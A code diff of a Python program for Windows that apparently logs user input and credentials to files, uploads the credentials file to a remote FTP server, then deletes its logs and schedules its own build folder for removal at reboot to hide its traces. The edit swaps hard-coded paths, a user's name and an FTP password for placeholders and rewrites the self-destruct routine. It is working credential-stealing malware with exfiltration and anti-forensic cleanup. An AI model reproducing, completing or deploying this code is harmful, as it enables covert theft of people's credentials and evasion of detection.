@@ -9,10 +9,9 @@ import ftplib
 import Analyzer
 import win32file
 import win32api
-#import ctypes
 
-log_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\log.txt'
-cred_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\totally_not_credentials.txt'
+log_file = 'LOG_FILE_PATH'
+cred_file = 'CRED_FILE_PATH'
 
 class Logger:
     def __init__(self, log_file, cred_file):
@@ -43,7 +42,7 @@ class Logger:
     
     def send_file(self):
         # send file of credentials thru ftp
-        session = ftplib.FTP('127.0.0.1', 'Admin', 'Twinbros1;')
+        session = ftplib.FTP('IP_ADDR', 'FTP_USERNAME', 'FTP_PASSWORD')
         file_to_send = open(self.cred_file, 'rb')
         session.storbinary('STOR ' + 'creds.txt', file_to_send)
         file_to_send.close()
@@ -53,19 +52,27 @@ class Logger:
         logging.shutdown()
         os.remove(log_file)
         os.remove(cred_file)
-        recursively_destroy(os.getcwd())
-        #var = win32file.MoveFileEx((os.getcwd() + r'\build'), None ,
-        #        win32file.MOVEFILE_DELAY_UNTIL_REBOOT)
-        #rint(var)
-        #ctypes.windll.kernel32.MoveFileExA((getcwd() + r'\build'), None,
-        #                                    win32file.MOVEFILE_DELAY_UNTIL_REBOOT)
+        self.recursively_destroy(os.getcwd() + r'\build')
     
+    '''
     def recursively_destroy(self, path):
-        items_to_destroy = os.listdir(path)
-        for items in items_to_destroy:
-            if(os.path.isdir(path)):
-                recursively_destroy()
-        
+        if(os.path.isdir(path)):
+            items_to_destroy = os.listdir(path)
+            
+            for item in items_to_destroy:
+                new_path = path + '\\' + item
+                if(os.path.isdir(new_path)):
+                    self.recursively_destroy(new_path)
+                else:
+                    try:
+                        win32file.MoveFileEx((new_path), 'C\\$Recycle.bin',
+                            win32file.MOVEFILE_DELAY_UNTIL_REBOOT)
+                    except:
+                        continue
+        else:
+            var = win32file.MoveFileEx(path,  'C\\$Recycle.bin' ,
+                    win32file.MOVEFILE_DELAY_UNTIL_REBOOT)
+    '''
 
 if __name__ == '__main__':
     logger = Logger(log_file, cred_file)
